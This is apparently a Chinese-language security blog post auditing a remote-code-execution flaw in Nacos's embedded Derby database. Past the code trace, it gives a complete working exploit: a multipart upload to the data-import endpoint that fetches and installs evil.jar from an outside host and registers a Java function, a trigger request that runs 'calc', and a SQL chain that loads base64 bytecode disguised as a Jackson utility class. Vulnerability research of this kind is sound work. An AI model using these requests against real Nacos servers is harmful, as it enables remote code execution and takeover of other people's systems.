#  Nacos Derby RCE代码审计   
原创 T3Ysec  T3Ysec   2025-05-07 06:03  
  
漏洞：  
com/alibaba/nacos/config/server/controller/ConfigOpsController.  
java  
  
跟踪到路由  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZHOVzLuAEuJxKVMqmvrNnFNu0aQO9hc1Rhn46ApXibicNGAaMiaff4oHYA/640?wx_fmt=png&from=appmsg "")  
  
databaseOperate.  
dataImport(file)  
 看翻译也可以知道数据库操作类的方法，  
但是传入的是文件类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZL8e01fp7d5JO7XLq35S7oVYSIGwk4ibdJGe2NFoiaRkYbQXGUQURHjWA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZibweHmCY8zgVzaNrueXXGr06GnTfy73gpQMlP0fdlgk0icN59bmaJFdw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZEs5NKNnb4IoJnx0jqoKn7pT7tIVfW0lcftG0sbZRGFTWudCUflCicwA/640?wx_fmt=png&from=appmsg "")  
  
跟入代码，  
读取临时文件中的数据，  
不断去whlie拼接sql语句（sql语句是恶意的derby语句）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZTjickrOibApHcd1mTl11yzpTcre67G1nmoq49jv5gicaWtJpG3FDBd3sA/640?wx_fmt=png&from=appmsg "")  
  
判断完文件没有内容了就设置sqls语句  
  
```
List<ModifyRequest> sqls = batchUpdate.stream()
    .map(s -> {
        ModifyRequest request = new ModifyRequest(); // 创建一个新的 ModifyRequest 对象
        request.setSql(s);                           // 设置其 sql 属性为 s（s 是 batchUpdate 中的一个元素）
        return request;                              // 返回该对象
    })
    .collect(Collectors.toList());                  // 把所有 ModifyRequest 对象收集成 List

```  
  
  
随后进入  
futures.  
add(CompletableFuture.  
runAsync  
(() -> results.  
add(doDataImport(jdbcTemplate,  
 sqls))));  
 中的  
doDataImport(jdbcTemplate,  
 sqls)  
 传递了我们的恶意sqls语句  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZ8UyDE7XiaGwB08B7SsKMf1pCianxB1CY7tuicm0Dg55nhDZuutFGZMazA/640?wx_fmt=png&from=appmsg "")  
  
随后执行sql语句  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZAl7P6y7FvI1J8HbhfhBKONmHGaSxg0g0ckRTgl8hpax2iawlaLjwOqg/640?wx_fmt=png&from=appmsg "")  
  
看看  
template.  
batchUpdate(sql)  
 是否是真的执行了sql语句，  
跟入代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZyQ0RVLzzkZvkUyUr5YHmtmedtLDKxMXCf8fypUhq7icEd1tSKFTs2ew/640?wx_fmt=png&from=appmsg "")  
  
然后进入  
BatchUpdateStatementCallback  
 类下的  
doInStatement  
方法  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZPICbUOmwTiculzicKubZ8on0l9rqbibhF6uNYVRaPhWPgiaAE7TsDU1cbQ/640?wx_fmt=png&from=appmsg "")  
  
最后doInStatement完整的逻辑：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZdNClAg2HRKowodfiba3frxqAibnB6r9SOEXZboRJqSAjghBianFCQUzog/640?wx_fmt=png&from=appmsg "")  
  
•  
  
调用了一个 sqlj.  
install_jar 存储过程，  
用于安装一个 JAR 文件。  
该 JAR 文件被从http:  
//192.  
168.  
244.  
133:  
8000/test.  
java下载  
  
•  
  
调用了 SYSCS_UTIL.  
SYSCS_SET_DATABASE_PROPERTY 存储过程，  
将属性 derby.  
database.  
classpath 的值设置为 NACOS.  
bGgDnUtc，  
使 Derby 数据库能够加载该 JAR 文件  
  
•  
  
创建了一个名为 S_EXAMPLE_jtZJBFpM 的方法。  
该函数的具体实现是在 Java 类 test.  
poc.  
Example 的 exec 方法(因为是条件竞赛，  
id=jtZJBFpM可能会失效，  
可以用python随机生成)  
  
这样恶意jar就已经加载进入数据库了  
  
再次使用select查询数据库就能执行恶意命令，  
p牛师傅给出过一个链接  
  
https://github.com/alibaba/nacos/issues/4463  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZpUibHw6kGmNS7HJ0sXz3MjMiaLYr5ic268ibtSYz0szibS0ib6KSupZTDcGg/640?wx_fmt=png&from=appmsg "")  
  
  
数据包：  
  
```
POST /nacos/v1/cs/ops/data/removal HTTP/1.1
Host: 192.168.4.1:8848
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Length: 495
Content-Type: multipart/form-data; boundary=2a262c4e7ea55d81b1906382912b7422

--2a262c4e7ea55d81b1906382912b7422
Content-Disposition: form-data; name="file"; filename="file"

CALL sqlj.install_jar('http://192.168.4.1:8000/evil.jar', 'NACOS.jtZJBFpQ', 0)

        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.jtZJBFpQ')

        CREATE FUNCTION S_EXAMPLE_jtZJBFpQ( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'org.example.Example.exec'

--2a262c4e7ea55d81b1906382912b7422--

```  
  
  
  
触发数据包(这个接口什么sql都能执行)：  
  
```
GET /nacos/v1/cs/ops/derby?sql=select%20*%20from%20(select%20count(*)%20as%20b%2c%20S_EXAMPLE_jtZJBFpQ('calc')%20as%20a%20from%20config_info)%20tmp%20%2f*ROWS%20FETCH%20NEXT*%2f HTTP/1.1
Host: 192.168.4.1:8848
Content-Length: 2

```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/X2dze5v2iauLic05cqHcghPrIkPPRibq9CZblPKx3p4ibDrMyibfcuFYicY64js7AvfNPlFkIwEeVgKAF6UA2hlg9iblQ/640?wx_fmt=png&from=appmsg "")  
  
  
一步到位加载字节码：  
  
```
-- 1. 定义 Java 类型映射（只做一次）
CREATE TYPE pbqmhhjClass EXTERNAL NAME 'java.lang.Class' LANGUAGE JAVA;
CREATE TYPE pbqmhhjObject EXTERNAL NAME 'java.lang.Object' LANGUAGE JAVA;
CREATE TYPE pbqmhhjClassLoader EXTERNAL NAME 'java.lang.ClassLoader' LANGUAGE JAVA;

-- 2. 定义 Java 方法封装（使用 Spring/CGLIB）
CREATE FUNCTION base64Decode(className VARCHAR(32672))
  RETURNS VARCHAR(32672) FOR BIT DATA
  EXTERNAL NAME 'org.springframework.util.Base64Utils.decodeFromString'
  LANGUAGE JAVA PARAMETER STYLE JAVA;

CREATE FUNCTION getSystemCL()
  RETURNS pbqmhhjClassLoader
  EXTERNAL NAME 'java.lang.ClassLoader.getSystemClassLoader'
  LANGUAGE JAVA PARAMETER STYLE JAVA;

CREATE FUNCTION defineEvil(className VARCHAR(32672), bytes VARCHAR(32672) FOR BIT DATA, loader pbqmhhjClassLoader)
  RETURNS pbqmhhjClass
  EXTERNAL NAME 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)'
  LANGUAGE JAVA PARAMETER STYLE JAVA;

-- 3. 触发加载（base64 字符串替换为你的 payload）
INSERT INTO mytrigger VALUES (
  defineEvil('Evil', base64Decode('yv66...base64...=='), getSystemCL())
);

```  
  
  
#### 1. 创建 Java 类型映射  
  
  
首先，  
你定义了几个类型映射，  
允许 SQL 调用 Java 类：  
  
```
CREATE TYPE pbqmhhjClass EXTERNAL NAME 'java.lang.Class' LANGUAGE JAVA;
CREATE TYPE pbqmhhjObject EXTERNAL NAME 'java.lang.Object' LANGUAGE JAVA;
CREATE TYPE pbqmhhjClassLoader EXTERNAL NAME 'java.lang.ClassLoader' LANGUAGE JAVA;

```  
  
  
这些映射允许你在 SQL 中使用 Java 类类型。  
  
#### 2. 定义 Base64 解码函数  
  
  
接下来，  
创建了一个   
base64Decode  
 函数，  
利用 Spring 的   
Base64Utils  
 来解码传入的 Base64 字符串：  
  
```
CREATE FUNCTION pbqmhhj64Decode(className VARCHAR(32672))
RETURNS VARCHAR(32672) FOR BIT DATA
EXTERNAL NAME 'org.springframework.util.Base64Utils.decodeFromString'
LANGUAGE JAVA PARAMETER STYLE JAVA;

```  
  
  
这个函数允许你将 Base64 编码的恶意字节码转换成字节数据，  
以便后续加载。  
  
#### 3. 获取系统类加载器  
  
  
你还定义了一个函数来获取系统类加载器：  
  
ClassLoader.  
getSystemClassLoader()  
 会返回系统类加载器，  
用来加载定义的类。  
  
#### 4. 定义恶意类  
  
  
这个函数   
depbqmhhjClass  
 通过   
CGLIB  
 的   
ReflectUtils.  
defineClass  
 将字节数据加载到 JVM 中，  
并返回一个   
Class  
 类型对象：  
  
```
CREATE FUNCTION depbqmhhjClass(
  className VARCHAR(724),
  bytes VARCHAR(724) FOR BIT DATA,
  loader pbqmhhjClassLoader
) RETURNS pbqmhhjClass
EXTERNAL NAME 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)'
LANGUAGE JAVA PARAMETER STYLE JAVA;

```  
  
  
#### 5. 将恶意类插入表  
  
  
接下来，  
你插入了一个恶意类到表   
injepbqmhhjct  
 中，  
实际上传入了一个   
Base64  
 编码的字节数组，  
它代表了   
com.  
fasterxml.  
jackson.  
l.  
NetworkUtils  
 类：  
  
```
INSERT INTO injepbqmhhjct
VALUES (
  depbqmhhjClass(
    'com.fasterxml.jackson.l.NetworkUtils',
    pbqmhhj64Decode('yv66vgAAADQAIwoACQATCgAUABUIABYKABQAFwcAGAcAGQoABgAaBwAbBwAcAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACDxjbGluaXQ+AQANU3RhY2tNYXBUYWJsZQcAGAEAClNvdXJjZUZpbGUBAAl0ZXN0LmphdmEMAAoACwcAHQwAHgAfAQAEY2FsYwwAIAAhAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACIBAAR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAIAAkAAAAAAAIAAQAKAAsAAQAMAAAAHQABAAEAAAAFKrcAAbEAAAABAA0AAAAGAAEAAAADAAgADgALAAEADAAAAFQAAwABAAAAF7gAAhIDtgAEV6cADUu7AAZZKrcAB7+xAAEAAAAJAAwABQACAA0AAAAWAAUAAAAGAAkACQAMAAcADQAIABYACgAPAAAABwACTAcAEAkAAQARAAAAAgAS'),
    getpbqmhhjmClassLoader()
  )
);

```  
  
  
#### 6. 恶意类加载与执行  
  
  
通过   
pbqmhhj64Decode  
 解码 Base64 字节流后，  
调用   
ReflectUtils.  
defineClass  
 来动态加载恶意类   
com.  
fasterxml.  
jackson.  
l.  
NetworkUtils  
，  
这个类的字节码包含了恶意代码，  
可以在加载时触发执行。  
  
  
